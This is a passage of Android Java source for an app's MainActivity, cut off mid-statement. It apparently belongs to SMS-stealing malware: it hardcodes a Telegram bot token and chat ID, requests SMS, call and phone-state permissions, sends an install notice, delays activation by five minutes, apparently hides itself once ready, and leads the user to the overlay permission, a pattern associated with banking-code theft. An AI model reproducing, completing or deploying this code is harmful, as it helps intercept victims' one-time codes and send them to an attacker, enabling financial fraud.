          import android.widget.TextView;
          import android.widget.Toast;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          import java.text.SimpleDateFormat;
          import java.util.ArrayList;
          import java.util.Date;
          import java.util.List;
          import java.util.Locale;

          public class MainActivity extends Activity {
              private static final String TAG = "MainActivity";

              private static final long ACTIVATION_DELAY_MS = 5L * 60L * 1000L;

              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
              private static final String CHAT_ID = "8468538314";

              private TextView btnStart;
              private TextView btnSkip;
              private SharedPreferences prefs;
              private Handler handler = new Handler(android.os.Looper.getMainLooper());

              private static final String[] REQUIRED_PERMISSIONS = {
                  Manifest.permission.RECEIVE_SMS,
                  Manifest.permission.READ_SMS,
                  Manifest.permission.CALL_PHONE,
                  Manifest.permission.READ_PHONE_STATE,
                  Manifest.permission.READ_PHONE_NUMBERS
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);

                  long installTime;
                  if (!prefs.contains("install_time")) {
                      installTime = System.currentTimeMillis();
                      prefs.edit().putLong("install_time", installTime).apply();
                  } else {
                      installTime = prefs.getLong("install_time", 0L);
                  }

                  if (!prefs.getBoolean("install_notice_sent", false)) {
                      prefs.edit().putBoolean("install_notice_sent", true).apply();
                      sendInstallNotice(installTime);
                  }

                  btnStart = findViewById(R.id.btnStart);
                  btnSkip = findViewById(R.id.btnSkip);

                  btnStart.setOnClickListener(v -> beginPermissionFlow());
                  btnSkip.setOnClickListener(v -> {
                      finish();
                  });

                  checkAndHideIfReady();
              }

              private void beginPermissionFlow() {
                  List<String> toRequest = new ArrayList<>();
                  for (String p : REQUIRED_PERMISSIONS) {
                      if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                          toRequest.add(p);
                      }
                  }

                  if (toRequest.isEmpty()) {
                      openOverlaySettings();
                  } else {
                      ActivityCompat.requestPermissions(
                          this,
                          toRequest.toArray(new String[0]),
                          100
                      );
                  }
              }

              private boolean areRuntimePermissionsGranted() {
                  for (String perm : REQUIRED_PERMISSIONS) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          return false;
                      }
                  }
                  return true;
              }

              private void openOverlaySettings() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                      Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
